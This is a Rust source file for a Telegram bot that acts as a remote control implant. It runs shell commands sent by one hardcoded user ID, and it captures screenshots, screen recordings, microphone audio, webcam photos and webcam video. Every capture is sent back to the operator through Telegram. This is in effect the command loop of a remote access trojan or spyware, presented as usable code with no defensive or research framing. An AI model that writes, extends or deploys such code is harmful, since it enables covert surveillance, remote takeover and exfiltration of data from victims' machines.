// src/main.rs

use teloxide::prelude::*;
use teloxide::types::InputFile;
use std::str::FromStr;

mod audio;
mod camera;
mod execution;
mod screen;
mod screenshot;
mod video;

// Define authorized user IDs
const AUTHORIZED_USER_IDS: &[i64] = &[7660492768]; // Your user ID

#[tokio::main]
async fn main() {
    let bot = Bot::from_env(); // Load bot token from environment variable
    teloxide::repl(bot, handle_message).await;
}

// Parse and execute commands
async fn handle_message(bot: Bot, message: Message) -> ResponseResult<()> {
    // Check if the message is from an authorized user
    if !AUTHORIZED_USER_IDS.contains(&message.from.id) {
        bot.send_message(message.chat.id, "You are not authorized to use this bot.").await?;
        return Ok(());
    }

    if let Some(text) = message.text() {
        let args: Vec<&str> = text.split_whitespace().collect();

        match args[0] {
            "exe:" => {
                if args.len() > 1 {
                    let command = &args[1..].join(" ");
                    let output = execution::execute_command(command);
                    bot.send_message(message.chat.id, output).await?;
                } else {
                    bot.send_message(message.chat.id, "Usage: exe: <command>").await?;
                }
            }
            "ss:" => {
                match screenshot::capture_screenshot() {
                    Ok(file_path) => {
                        bot.send_photo(message.chat.id, InputFile::file(file_path))
                            .await?;
                    }
                    Err(e) => {
                        bot.send_message(message.chat.id, format!("Error: {}", e))
                            .await?;
                    }
                }
            }
            "screen_record:" => {
                if args.len() == 2 {
                    if let Ok(seconds) = u32::from_str(args[1]) {
                        match screen::record_screen(seconds) {
                            Ok(file_path) => {
                                bot.send_video(message.chat.id, InputFile::file(file_path))
                                    .await?;
                            }
                            Err(e) => {
                                bot.send_message(message.chat.id, format!("Error: {}", e))
                                    .await?;
                            }
                        }
                    } else {
                        bot.send_message(message.chat.id, "Invalid duration").await?;
                    }
                } else {
                    bot.send_message(message.chat.id, "Usage: screen_record: <seconds>").await?;
                }
            }
            "audio_record:" => {
                if args.len() == 2 {
                    if let Ok(seconds) = u32::from_str(args[1]) {
                        match audio::record_audio(seconds) {
                            Ok(file_path) => {
                                bot.send_audio(message.chat.id, InputFile::file(file_path))
                                    .await?;
                            }
                            Err(e) => {
                                bot.send_message(message.chat.id, format!("Error: {}", e))
                                    .await?;
                            }
                        }
                    } else {
                        bot.send_message(message.chat.id, "Invalid duration").await?;
                    }
                } else {
                    bot.send_message(message.chat.id, "Usage: audio_record: <seconds>").await?;
                }
            }
            "photo:" => {
                match camera::capture_photo() {
                    Ok(file_path) => {
                        bot.send_photo(message.chat.id, InputFile::file(file_path))
                            .await?;
                    }
                    Err(e) => {
                        bot.send_message(message.chat.id, format!("Error: {}", e))
                            .await?;
                    }
                }
            }
            "video_record:" => {
                if args.len() == 2 {
                    if let Ok(seconds) = u32::from_str(args[1]) {
                        match video::record_video(seconds) {
                            Ok(file_path) => {
                                bot.send_video(message.chat.id, InputFile::file(file_path))
                                    .await?;
                            }
                            Err(e) => {
                                bot.send_message(message.chat.id, format!("Error: {}", e))
                                    .await?;
                            }
                        }
                    } else {
                        bot.send_message(message.chat.id, "Invalid duration").await?;
                    }
                } else {
                    bot.send_message(message.chat.id, "Usage: video_record: <seconds>").await?;
                }
            }
            _ => {
                bot.send_message(message.chat.id, "Unknown command.").await?;
            }
        }
    }
    Ok(())
}
